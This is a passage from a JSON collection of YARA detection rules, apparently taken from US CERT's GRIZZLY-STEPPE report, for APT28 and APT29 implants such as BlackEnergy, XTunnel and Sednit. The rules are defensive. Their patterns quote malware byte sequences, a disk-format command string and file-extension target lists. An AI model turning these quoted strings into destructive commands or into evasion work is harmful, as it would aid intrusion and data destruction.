99 8D 4C 24 14 51 52 50 56 FF 15 ??\n         ?? ?? ?? 85 C0 74 0B 83 C3 01 81 FB 00 01 00 00 7C B6 }\n      $f = {83 c4 0c 53 53 6a 03 53 6a 03 68 00 00 00 c0}\n   condition:\n      ($a and $b) or $c or $d or ($openPhysicalDiskOverwriteWithZeros and $f)\n}",
  "IMPLANT_4_v10": "rule IMPLANT_4_v10 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $ ={A1B05C72}\n      $ ={EB3D0384}\n      $ ={6F45594E}\n      $ ={71815A4E}\n      $ ={D5B03E72}\n      $ ={6B43594E}\n      $ ={F572993D}\n      $ ={665D9DC0}\n      $ ={0BE7A75A}\n      $ ={F37443C5}\n      $ ={A2A474BB}\n      $ ={97DEEC67}\n      $ ={7E0CB078}\n      $ ={9C9678BF}\n      $ ={4A37A149}\n      $ ={8667416B}\n      $ ={0A375BA4}\n      $ ={DC505A8D}\n      $ ={02F1F808}\n      $ ={2C819712}\n   condition:\n      uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and 15 of them\n}",
  "IMPLANT_4_v11": "rule IMPLANT_4_v11 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $ = \"/c format %c: /Y /X /FS:NTFS\"\n      $ = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" wide\n      $ = \".dll.exe.xml.ttf.nfo.fon.ini.cfg.boot.jar\" wide\n      $= \".crt.bin.exe.db.dbf.pdf.djvu.doc.docx.xls.xlsx.jar.ppt.pptx.tib.vhd.iso.lib.mdb.accdb.sql.mdf.xml.rtf.ini.cf g.boot.txt.rar.msi.zip.jpg.bmp.jpeg.tiff\" wide\n      $tempfilename = \"%ls_%ls_%ls_%d.~tmp\" ascii wide\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them\n}",
  "IMPLANT_4_v12": "rule IMPLANT_4_v12 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $CMP1 = {81 ?? 4D 5A 00 00 }\n      $SUB1 = {81 ?? 00 10 00 00}\n      $CMP2 = {66 81 38 4D 5A}\n      $SUB2 = {2D 00 10 00 00}\n      $HAL = \"HAL.dll\"\n      $OUT = {E6 64 E9 ?? ?? FF FF}\n   condition:\n   (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n   uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and ($CMP1 or $CMP2)\n   and ($SUB1 or $SUB2) and $OUT and $HAL\n}",
  "IMPLANT_4_v13": "rule IMPLANT_4_v13 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $XMLDOM1 = {81 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}\n      $XMLDOM2 = {90 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}\n      $XMLPARSE = {8B 06 [0-2] 8D 55 ?C 52 FF 75 08 [0-2] 50 FF 91 04 01 00 00\n         66 83 7D ?C FF 75 3? 8B 06 [0-2] 8D 55 F? 52 50 [0-2] FF 51 30 85 C0\n         78 2?}\n      $EXP1 = \"DispatchCommand\"\n      $EXP2 = \"DispatchEvent\"\n      $BDATA = {85 C0 74 1? 0F B7 4? 06 83 C? 28 [0-6] 72 ?? 33 C0 5F 5E 5B 5D\n         C2 08 00 8B 4? 0? 8B 4? 0? 89 01 8B 4? 0C 03 [0-2] EB E?}\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_5_v1": "rule IMPLANT_5_v1 {\n   meta:\n      description = \"XTunnel Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $hexstr = {2D 00 53 00 69 00 00 00 2D 00 53 00 70 00 00 00 2D 00 55 00\n         70 00 00 00 2D 00 50 00 69 00 00 00 2D 00 50 00 70 00 00 00}\n      $UDPMSG1 = \"error 2005 recv from server UDP - %d\\x0a\"\n      $TPSMSG1 = \"error 2004 send to TPS - %d\\x0a\"\n      $TPSMSG2 = \"error 2003 recv from TPS - %d\\x0a\"\n      $UDPMSG2 = \"error 2002 send to server UDP - %d\\x0a\"\n   condition:\n      any of them\n}",
  "IMPLANT_5_v2": "rule IMPLANT_5_v2 {\n   meta:\n      description = \"XTunnel Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $key0 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }\n      $key1 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }\n      $key2 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }\n      $key3 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }\n      $key4 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }\n      $key5 = { 34F1AE17017AF16021ADA5CE3F77675BBC6E7DEC6478D6078A0B22E5FDFF3B31 }\n      $key6 = { F0EA48F164395186E6F754256EBB812A2AFE168E77ED9501F8B8E6F5B72126A7 }\n      $key7 = { 0B6E9970A8EAF68EE14AB45005357A2F3391BEAA7E53AB760B916BC2B3916ABE }\n      $key8 = { FF032EA7ED2436CF6EEA1F741F99A3522A61FDA8B5A81EC03A8983ED1AEDAB1A }\n      $key9 = { F0DAC1DDFEF7AC6DE1CBE1006584538FE650389BF8565B32E0DE1FFACBCB14BB }\n      $key10 = { A5D699A3CD4510AF11F1AF767602055C523DF74B94527D74319D6EFC6883B80D }\n      $key11 = { 5951B02696C1D5A7B2851D28872384DA607B25F4CEA268FF3FD7FBA75AB3B4B3 }\n      $key12 = { 0465D99B26AF42D8346001BB838595E301BAD8CF5D40CE9C17C944717DF82481 }\n      $key13 = { 5DFE1C83AD5F5CE1BF5D9C42E23225E3ECFDB2493E80E6554A2AC7C722EB4880 }\n      $key14 = { E9650396C45F7783BC14C59F46EA8232E8357C26B5627BFF8C42C6AE2E0F2E17 }\n      $key15 = { 7432AE389125BB4E3980ED7F6A6FB252A42E785A90F4591C3620CA642FF97CA3 }\n      $key16 = { 2B2ADBBC4F960A8916F7088067BAD30BE84B65783FBF9476DF5FDA0E5856B183 }\n      $key17 = { 808C3FD0224A59384161B8A81C8BB404D7197D16D8118CB77067C5C8BD764B3E }\n      $key18 = { 028B0E24D5675C16C815BFE4A073E9778C668E65771A1CE881E2B03F58FC7D5B }\n      $key19 = { 878B7F5CF2DC72BAF1319F91A4880931EE979665B1B24D3394FE72EDFAEF4881 }\n      $key20 = { 7AC7DD6CA34F269481C526254D2F563BC6ECA1779FEEAA33EC1C20E60B686785 }\n      $key21 = { 3044F1D394186815DD8E3A2BBD9166837D07FA1CF6A550E2C170C9CDD9305209 }\n      $key22 = { 7544DC095C441E39D258648FE9CB1267D20D83C8B2D3AB734474401DA4932619 }\n      $key23 = { D702223347406C1999D1A9829CBBE96EC86D377A40E2EE84562EA1FAC1C71498 }\n      $key24 = { CA36CB1177382A1009D392A58F7C1357E94AD2292CC0AE82EE4F7DB0179148E1 }\n      $key25 = { C714F23E4C1C4E55F0E1FA7F5D0DD64658A86F84681D07576D840784154F65DC }\n      $key26 = { 63571BAF736904634AFEE2A70CB9ED64615DE8CA7AEF21E773286B8877D065DB }\n      $key27 = { 27808A9BE98FFE348DE1DB999AC9FDFB26E6C5A0D5E688490EF3D186C43661EB }\n      $key28 = { B6EB86A07A85D40866AFA100789FFB9E85C13F5AA7C7A3B6BA753C7EAB9D6A62 }\n      $key29 = { 88F0020375D60BDB85ACDBFE4BD79CD098DB2B3FA2CEF55D4331DBEFCE455157 }\n      $key30 = { 36535AAB296587AE1162AC5D39492DD1245811C72706246A38FF590645AA5D7B }\n      $key31 = { FDB726261CADD52E10818B49CAB81BEF112CB63832DAA26AD9FC711EA6CE99A4 }\n      $key32 = { 86C0CAA26D9FD07D215BC7EB14E2DA250E905D406AFFAB44FB1C62A2EAFC4670 }\n      $key33 = { BC101329B0E3A7D13F6EBC535097785E27D59E92D449D6D06538725034B8C0F0 }\n      $key34 = { C8D31A78B7C149F62F06497F9DC1DDC4967B566AC52C3A2A65AC7A99643B8A2D }\n      $key35 = { 0EA4A5C565EFBB94F5041392C5F0565B6BADC630D9005B3EADD5D81110623E1F }\n      $key36 = { 06E4E46BD3A0FFC8A4125A6A02B0C56D5D8B9E378CF97539CE4D4ADFAF89FEB5 }\n      $key37 = { 6DE22040821F0827316291331256A170E23FA76E381CA7066AF1E5197AE3CFE7 }\n      $key38 = { C6EF27480F2F6F40910074A45715143954BBA78CD74E92413F785BBA5B2AA121 }\n      $key39 = { 19C96A28F8D9698ADADD2E31F2426A46FD11D2D45F64169EDC7158389BFA59B4 }\n      $key40 = { C3C3DDBB9D4645772373A815B5125BB2232D8782919D206E0E79A6A973FF5D36 }\n      $key41 = { C33AF1608037D7A3AA7FB860911312B4409936D236564044CFE6ED42E54B78A8 }\n      $key42 = { 856A0806A1DFA94B5E62ABEF75BEA3B657D9888E30C8D2FFAEC042930BBA3C90 }\n      $key43 = { 244496C524401182A2BC72177A15CDD2EF55601F1D321ECBF2605FFD1B9B8E3F }\n      $key44 = { DF24050364168606D2F81E4D0DEB1FFC417F1B5EB13A2AA49A89A1B5242FF503 }\n      $key45 = { 54FA07B8108DBFE285DD2F92C84E8F09CDAA687FE492237F1BC4343FF4294248 }\n      $key46 = { 23490033D6BF165B9C45EE65947D6E6127D6E00C68038B83C8BFC2BCE905040C }\n      $key47 = { 4E044025C45680609B6EC52FEB3491130A711F7375AAF63D69B9F952BEFD5F0C }\n      $key48 = { 019F31C5F5B2269020EBC00C1F511F2AC23E9D37E89374514C6DA40A6A03176C }\n      $key49 = { A2483197FA57271B43E7276238468CFB8429326CBDA7BD091461147F642BEB06 }\n      $key50 = { 731C9D6E74C589B7ACB019E5F6A6E07ACF12E68CB9A396CE05AA4D69D5387048 }\n      $key51 = { 540DB6C8D23F7F7FEF9964E53F445F0E56459B10E931DEEEDB2B57B063C7F8B7 }\n      $key52 = { D5AF80A7EEFF26DE988AC3D7CE23E62568813551B2133F8D3E973DA15E355833 }\n      $key53 = { E4D8DBD3D801B1708C74485A972E7F00AFB45161C791EE05282BA68660FFBA45 }\n      $key54 = { D79518AF96C920223D687DD596FCD545B126A678B7947EDFBF24661F232064FB }\n      $key55 = { B57CAA4B45CA6E8332EB58C8E72D0D9853B3110B478FEA06B35026D7708AD225 }\n      $key56 = { 077C714C47DFCF79CA2742B1544F4AA8035BB34AEA9D519DEE77745E01468408 }\n      $key57 = { C3F5550AD424839E4CC54FA015994818F4FB62DE99B37C872AF0E52C376934FA }\n      $key58 = { 5E890432AE87D0FA4D209A62B9E37AAEDEDC8C779008FEBAF9E4E6304D1B2AAC }\n      $key59 = { A42EDE52B5AF4C02CFE76488CADE36A8BBC3204BCB1E05C402ECF450071EFCAB }\n      $key60 = { 4CDAFE02894A04583169E1FB4717A402DAC44DA6E2536AE53F5F35467D31F1CA }\n      $key61 = { 0BEFCC953AD0ED6B39CE6781E60B83C0CFD166B124D1966330CBA9ADFC9A7708 }\n      $key62 = { 8A439DC4148A2F4D5996CE3FA152FF702366224737B8AA6784531480ED8C8877 }\n      $key63 = { CF253BE3B06B310901FF48A351471374AD35BBE4EE654B72B860F2A6EC7B1DBB }\n      $key64 = { A0599F50C4D059C5CFA16821E97C9596B1517B9FB6C6116F260415127F32CE1F }\n      $key65 = { 8B6D704F3DC9150C6B7D2D54F9C3EAAB14654ACA2C5C3952604E65DF8133FE0C }\n      $key66 = { A06E5CDD3871E9A3EE17F7E8DAE193EE47DDB87339F2C599402A78C15D77CEFD }\n      $key67 = { E52ADA1D9BC4C089DBB771B59904A3E0E25B531B4D18B58E432D4FA0A41D9E8A }\n      $key68 = { 4778A7E23C686C171FDDCCB8E26F98C4CBEBDF180494A647C2F6E7661385F05B }\n      $key69 = { FE983D3A00A9521F871ED8698E702D595C0C7160A118A7630E8EC92114BA7C12 }\n      $key70 = { 52BA4C52639E71EABD49534BBA80A4168D15762E2D1D913BAB5A5DBF14D9D166 }\n      $key71 = { 931EB8F7BC2AE1797335C42DB56843427EB970ABD601E7825C4441701D13D7B1 }\n      $key72 = { 318FA8EDB989672DBE2B5A74949EB6125727BD2E28A4B084E8F1F50604CCB735 }\n      $key73 = { 5B5F2315E88A42A7B59C1B493AD15B92F819C021BD70A5A6619AAC6666639BC2 }\n      $key74 = { C2BED7AA481951FEB56C47F03EA38236BC425779B2FD1F1397CB79FE2E15C0F0 }\n      $key75 = { D3979B1CB0EC1A655961559704D7CDC019253ACB2259DFB92558B7536D774441 }\n      $key76 = { 0EDF5DBECB772424D879BBDD51899D6AAED736D0311589566D41A9DBB8ED1CC7 }\n      $key77 = { CC798598F0A9BCC82378A5740143DEAF1A147F4B2908A197494B7202388EC905 }\n      $key78 = { 074E9DF7F859BF1BD1658FD2A86D81C282000EAB09AF4252FAB45433421D3849 }\n      $key79 = { 6CD540642E007F00650ED20D7B54CFFD54DDA95D8DEBB087A004BAE222F22C8E }\n      $key80 = { C76CF2F66C71F6D17FC8DEFA1CAEF8718BA1CE188C7EA02C835A0FA54D3B3314 }\n      $key81 = { A7250A149600E515C9C40FE5720756FDA8251635A3B661261070CB5DABFE7253 }\n      $key82 = { 237C67B97D4CCE4610DE2B82E582808EA796C34A4C24715C953CBA403B2C935E }\n      $key83 = { A8FA182547E66B57C497DAAA195A38C0F0FB0A3C1F7B98B4B852F5F37E885127 }\n      $key84 = { 83694CCA50B821144FFBBE6855F62845F1328111AE1AC5666CBA59EB43AA12C6 }\n      $key85 = { 145E906416B17865AD37CD022DF5481F28C930D6E3F53C50B0953BF33F4DB953 }\n      $key86 = { AB49B7C2FA3027A767F5AA94EAF2B312BBE3E89FD924EF89B92A7CF977354C22 }\n      $key87 = { 7E04E478340C209B01CA2FEBBCE3FE77C6E6169F0B0528C42FA4BDA6D90AC957 }\n      $key88 = { 0EADD042B9F0DDBABA0CA676EFA4EDB68A045595097E5A392217DFFC21A8532F }\n      $key89 = { 5623710F134ECACD5B70434A1431009E3556343ED48E77F6A557F2C7FF46F655 }\n      $key90 = { 6968657DB62F4A119F8E5CB3BF5C51F4B285328613AA7DB9016F8000B576561F }\n      $key91 = { DEBB9C95EAE6A68974023C335F8D2711135A98260415DF05845F053AD65B59B4 }\n      $key92 = { 16F54900DBF08950F2C5835153AB636605FB8C09106C0E94CB13CEA16F275685 }\n      $key93 = { 1C9F86F88F0F4882D5CBD32876368E7B311A84418692D652A6A4F315CC499AE8 }\n      $key94 = { E920E0783028FA05F4CE2D6A04BBE636D56A775CFD4DAEA3F2A1B8BEEB52A6D4 }\n      $key95 = { 73874CA3AF47A8A315D50E1990F44F655EC7C15B146FFE0611B6C4FC096BD07C }\n      $key96 = { F21C1FA163C745789C53922C47E191A5A85301BDC2FFC3D3B688CFBFF39F3BE5 }\n      $key97 = { BC5A861F21CB98BD1E2AE9650B7A0BB4CD0C71900B3463C1BC3380AFD2BB948E }\n      $key98 = { 151BAE36E646F30570DC6A7B57752F2481A0B48DD5184E914BCF411D8AD5ACA0 }\n      $key99 = { F05AD6D7A0CADC10A6468BFDBCBB223D5BD6CA30EE19C239E8035772D80312C9 }\n      $key100 = { 5DE9A0FDB37C0D59C298577E5379BCAF4F86DF3E9FA17787A4CEFA7DD10C462E }\n      $key101 = { F5E62BA862380224D159A324D25FD321E5B35F8554D70CF9A506767713BCA508 }\n      $key102 = { A2D1B10409B328DA0CCBFFDE2AD2FF10855F95DA36A1D3DBA84952BB05F8C3A7 }\n      $key103 = { C974ABD227D3AD339FAC11C97E11D904706EDEA610B181B8FAD473FFCC36A695 }\n      $key104 = { AB5167D2241406C3C0178D3F28664398D5213EE5D2C09DCC9410CB604671F5F1 }\n      $key105 = { C25CC4E671CAAA31E137700A9DB3A272D4E157A6A1F47235043D954BAE8A3C70 }\n      $key106 = { E6005757CA0189AC38F9B6D5AD584881399F28DA949A0F98D8A4E3862E20F715 }\n      $key107 = { 204E6CEB4FF59787EF4D5C9CA5A41DDF4445B9D8E0C970B86D543E9C7435B194 }\n      $key108 = { 831D7FD21316590263B69E095ABBE89E01A176E16AE799D83BD774AF0D254390 }\n      $key109 = { 42C36355D9BC573D72F546CDB12E6BB2CFE2933AC92C12040386B310ABF6A1ED }\n      $key110 = { B9044393C09AD03390160041446BF3134D864D16B25F1AB5E5CDC690C4677E7D }\n      $key111 = { 6BC1102B5BE05EEBF65E2C3ACA1F4E17A59B2E57FB480DE016D371DA3AEF57A5 }\n      $key112 = { B068D00B482FF73F8D23795743C76FE8639D405EE54D3EFB20AFD55A9E2DFF4E }\n      $key113 = { 95CF5ADDFE511C8C7496E3B75D52A0C0EFE01ED52D5DD04D0CA6A7ABD3A6F968 }\n      $key114 = { 75534574A4620019F8E3D055367016255034FA7D91CBCA9E717149441742AC8D }\n      $key115 = { 96F1013A5301534BE424A11A94B740E5EB3A627D052D1B769E64BAB6A666433C }\n      $key116 = { 584477AB45CAF729EE9844834F84683ABECAB7C4F7D23A9636F54CDD5B8F19B3 }\n      $key117 = { D3905F185B564149EE85CC3D093477C8FF2F8CF601C68C38BBD81517672ECA3A }\n      $key118 = { BF29521A7F94636D1930AA236422EB6351775A523DE68AF9BF9F1026CEDA618D }\n      $key119 = { 04B3A783470AF1613A9B849FBD6F020EE65C612343EB1C028B2C28590789E60B }\n      $key120 = { 3D8D8E84977FE5D21B6971D8D873E7BED048E21333FE15BE2B3D1732C7FD3D04 }\n      $key121 = { 8ACB88224B6EF466D7653EB0D8256EA86D50BBA14FD05F7A0E77ACD574E9D9FF }\n      $key122 = { B46121FFCF1565A77AA45752C9C5FB3716B6D8658737DF95AE8B6A2374432228 }\n      $key123 = { A4432874588D1BD2317224FB371F324DD60AB25D4191F2F01C5C13909F35B943 }\n      $key124 = { 78E1B7D06ED2A2A044C69B7CE6CDC9BCD77C19180D0B082A671BBA06507349C8 }\n      $key125 = { 540198C3D33A631801FE94E7CB5DA3A2D9BCBAE7C7C3112EDECB342F3F7DF793 }\n      $key126 = { 7E905652CAB96ACBB7FEB2825B55243511DF1CD8A22D0680F83AAF37B8A7CB36 }\n      $key127 = { 37218801DBF2CD92F07F154CD53981E6189DBFBACAC53BC200EAFAB891C5EEC8 }\n   condition:\n      any of them\n}",
  "IMPLANT_5_v3": "rule IMPLANT_5_v3 {\n   meta:\n      description = \"XTunnel Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $BYTES1 = { 0F AF C0 6? C0 07 00 00 00 2D 01 00 00 00 0F AF ?? 39 ?8 }\n      $BYTES2 = { 0F AF C0 6? C0 07 48 0F AF ?? 39 ?8 }\n   condition:\n      any of them\n}",
  "IMPLANT_5_v4": "rule IMPLANT_5_v4 {\n   meta:\n      description = \"XTunnel Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $FBKEY1 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }\n      $FBKEY2 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }\n      $FBKEY3 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }\n      $FBKEY4 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }\n      $FBKEY5 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }\n   condition:\n      all of them\n}",
  "IMPLANT_6_v1": "rule IMPLANT_6_v1\n{\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = \"dll.dll\" wide ascii\n      $STR2 = \"Init1\" wide ascii\n      $STR3 = \"netui.dll\" wide ascii\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v2": "rule IMPLANT_6_v2 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $obf_func = { 8B 45 F8 6A 07 03 C7 33 D2 89 45 E8 8D 47 01 5B 02 4D 0F F7 F3 6A 07 8A 04 32 33 D2 F6 E9 8A C8 8B C7 F7 F3 8A 44 3E FE 02 45 FC 02 0C 32 B2 03 F6 EA 8A D8 8D 47 FF 33 D2 5F F7 F7 02 5D 14 8B 45 E8 8B 7D F4 C0 E3 06 02 1C 32 32 CB 30 08 8B 4D 14 41 47 83 FF 09 89 4D 14 89 7D F4 72 A1 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v3": "rule IMPLANT_6_v3 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $deob_func = { 8D 46 01 02 D1 83 E0 07 8A 04 38 F6 EA 8B D6 83 E2 07 0A\n         04 3A 33 D2 8A 54 37 FE 03 D3 03 D1 D3 EA 32 C2 8D 56 FF 83 E2 07 8A\n         1C 3A 8A 14 2E 32 C3 32 D0 41 88 14 2E 46 83 FE 0A 7C ?? }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v4": "rule IMPLANT_6_v4 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $ASM = {53 5? 5? [6-15] ff d? 8b ?? b? a0 86 01 00 [7-13] ff d? ?b\n         [6-10] c0 [0-1] c3}\n   condition:\n   (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n   uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v5": "rule IMPLANT_6_v5 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 83 EC 18 8B 4C 24 24 B8 AB AA AA AA F7 E1 8B 44 24 20 53 55 8B\n         EA 8D 14 08 B8 AB AA AA AA 89 54 24 1C F7 E2 56 8B F2 C1 ED 02 8B DD\n         57 8B 7C 24 38 89 6C 24 1C C1 EE 02 3B DE 89 5C 24 18 89 74 24 20 0F\n         83 CF 00 00 00 8D 14 5B 8D 44 12 FE 89 44 24 10 3B DD 0F 85 CF 00 00\n         00 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA 83 F9 06 89 4C 24 38 0F 83\n         86 00 00 00 8A C3 B2 06 F6 EA 8B 54 24 10 88 44 24 30 8B 44 24 2C 8D\n         71 02 03 D0 89 54 24 14 8B 54 24 10 33 C0 8A 44 37 FE 03 D6 8B D8 8D\n         46 FF 0F AF DA 33 D2 BD 06 00 00 00 F7 F5 C1 EB 07 8A 04 3A 33 D2 32\n         D8 8D 46 01 F7 F5 8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5\n         8A 04 3A 22 C8 8B 44 24 14 02 D9 8A 0C 30 32 CB 88 0C 30 8B 4C 24 38\n         41 46 83 FE 08 89 4C 24 38 72 A1 8B 5C 24 18 8B 6C 24 1C 8B 74 24 20\n         8B 4C 24 10 43 83 C1 06 3B DE 89 4C 24 10 8B 4C 24 34 89 5C 24 18 0F\n         82 3C FF FF FF 3B DD 75 1A 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA EB\n         0D 33 C9 89 4C 24 38 E9 40 FF FF FF 33 C9 8B 44 24 24 33 D2 BE 06 00\n         00 00 89 4C 24 38 F7 F6 3B CA 89 54 24 24 0F 83 95 00 00 00 8A C3 B2\n         06 F6 EA 8D 1C 5B 88 44 24 30 8B 44 24 2C 8D 71 02 D1 E3 89 5C 24 34\n         8D 54 03 FE 89 54 24 14 EB 04 8B 5C 24 34 33 C0 BD 06 00 00 00 8A 44\n         3E FE 8B D0 8D 44 1E FE 0F AF D0 C1 EA 07 89 54 24 2C 8D 46 FF 33 D2\n         BB 06 00 00 00 F7 F3 8B 5C 24 2C 8A 04 3A 33 D2 32 D8 8D 46 01 F7 F5\n         8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5 8A 04 3A 22 C8 8B\n         44 24 14 02 D9 8A 0C 06 32 CB 88 0C 06 8B 4C 24 38 8B 44 24 24 41 46\n         3B C8 89 4C 24 38 72 8F 5F 5E 5D 5B 83 C4 18 C2 10 00 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v6": "rule IMPLANT_6_v6 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $Init1_fun = {68 10 27 00 00 FF 15 ?? ?? ?? ?? A1 ?? ?? ?? ?? 6A FF 50\n         FF 15 ?? ?? ?? ?? 33 C0 C3}\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_6_v7": "rule IMPLANT_6_v7 {\n   meta:\n      description = \"Sednit / EVILTOSS Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = \"Init1\"\n      $OPT1 = \"ServiceMain\"\n      $OPT2 = \"netids\" nocase wide ascii\n      $OPT3 = \"netui\" nocase wide ascii\n      $OPT4 = \"svchost.exe\" wide ascii\n      $OPT5 = \"network\" nocase wide ascii\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR1 and 2 of ($OPT*)\n}",
  "IMPLANT_7_v1": "rule IMPLANT_7_v1 {\n   meta:\n      description = \"Implant 7 by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 8A 44 0A 03 32 C3 0F B6 C0 66 89 04 4E 41 3B CF 72 EE }\n      $STR2 = { F3 0F 6F 04 08 66 0F EF C1 F3 0F 7F 04 11 83 C1 10 3B CF 72 EB }\n   condition:\n      (uint16(0) == 0x5A4D) and ($STR1 or $STR2)\n}",
